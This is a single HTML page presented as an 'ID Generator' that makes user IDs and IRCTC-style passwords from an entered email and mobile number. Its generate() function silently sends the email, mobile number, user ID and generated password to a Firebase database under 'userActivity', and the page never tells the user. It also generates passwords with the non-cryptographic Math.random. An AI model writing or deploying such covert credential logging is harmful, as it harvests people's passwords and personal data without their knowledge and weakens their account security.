<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ID Generator</title>

<style>
body{
  background:#eef2f5;
  font-family:Arial, sans-serif;
  display:flex;
  justify-content:center;
  padding:20px;
}
.container{
  background:#fff;
  width:100%;
  max-width:420px;
  padding:20px;
  border-radius:10px;
  box-shadow:0 0 12px rgba(0,0,0,.15);
}
h2{text-align:center}
input, textarea, button{
  width:100%;
  padding:10px;
  margin-top:10px;
  font-size:14px;
}
.row{display:flex;gap:6px}
button{
  background:#007bff;
  color:#fff;
  border:none;
  cursor:pointer;
  border-radius:6px;
}
button.copied{background:#28a745}
textarea{height:100px;resize:none}
input[readonly]{background:#f5f5f5;cursor:not-allowed}
</style>
</head>
<body>

<div class="container">
  <h2>ID Generator</h2>

  <input type="email" id="email" placeholder="Enter Email">
  <input type="text" id="mobile" placeholder="Enter Mobile Number">

  <button onclick="generate()">Generate</button>

  <div class="row">
    <input id="pass" readonly placeholder="Password">
    <button onclick="copyText(this,'pass')">Copy</button>
  </div>

  <div class="row">
    <input id="userid" readonly placeholder="User ID">
    <button onclick="copyText(this,'userid')">Copy</button>
  </div>

  <div class="row">
    <input id="phone" readonly placeholder="Mobile">
    <button onclick="copyText(this,'phone')">Copy</button>
  </div>

  <div class="row">
    <input id="mailout" readonly placeholder="Email">
    <button onclick="copyText(this,'mailout')">Copy</button>
  </div>

  <button onclick="copyAll(this)">ALL COPY</button>

  <textarea id="final" readonly placeholder="Final Output"></textarea>
</div>

<!-- FIREBASE -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
firebase.initializeApp({
  apiKey: "AIzaSyCTli8-1fuDNFAVdb9DNpmlLI0KalOEkGw",
  authDomain: "idgenerator-cd866.firebaseapp.com",
  databaseURL: "https://idgenerator-cd866-default-rtdb.firebaseio.com",
  projectId: "idgenerator-cd866",
  storageBucket: "idgenerator-cd866.firebasestorage.app",
  messagingSenderId: "1062444577602",
  appId: "1:1062444577602:web:6da63c0eb0b8479fd94edb"
});
const db = firebase.database();

/* üîê IRCTC VALID PASSWORD GENERATOR */
function generateIRCTCPassword(){
  const upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const lower="abcdefghijklmnopqrstuvwxyz";
  const number="0123456789";
  const special="@#$%&!";
  const all = upper + lower + number + special;

  let pass="";
  pass += upper[Math.floor(Math.random()*upper.length)];
  pass += lower[Math.floor(Math.random()*lower.length)];
  pass += number[Math.floor(Math.random()*number.length)];
  pass += special[Math.floor(Math.random()*special.length)];

  const len = Math.floor(Math.random()*(15-8+1))+8;
  while(pass.length < len){
    pass += all[Math.floor(Math.random()*all.length)];
  }

  return pass.split('').sort(()=>0.5-Math.random()).join('');
}

/* ‚ö° GENERATE */
function generate(){
  const email = emailInput = document.getElementById("email").value.trim();
  const mobile = document.getElementById("mobile").value.trim();
  if(!email || !mobile) return alert("Email & Mobile required");

  const base = email.split("@")[0].replace(/[^a-zA-Z]/g,"").toLowerCase();
  const letters="abcdefghijklmnopqrstuvwxyz";
  const id = base + Math.floor(Math.random()*10)
    + letters[Math.floor(Math.random()*26)]
    + letters[Math.floor(Math.random()*26)]
    + letters[Math.floor(Math.random()*26)];

  const password = generateIRCTCPassword();

  pass.value = password;
  userid.value = id;
  phone.value = mobile;
  mailout.value = email;

  /* FINAL OUTPUT (NO LABELS) */
  final.value = `${id}\n${password}\n${mobile}\n${email}`;

  db.ref("userActivity").push({
    email,mobile,userid:id,password,time:Date.now()
  });
}

/* COPY */
function copyText(btn,id){
  navigator.clipboard.writeText(document.getElementById(id).value);
  btn.classList.add("copied");
  setTimeout(()=>btn.classList.remove("copied"),1200);
}
function copyAll(btn){
  navigator.clipboard.writeText(final.value);
  btn.classList.add("copied");
  setTimeout(()=>btn.classList.remove("copied"),1200);
}
</script>

</body>
</html>
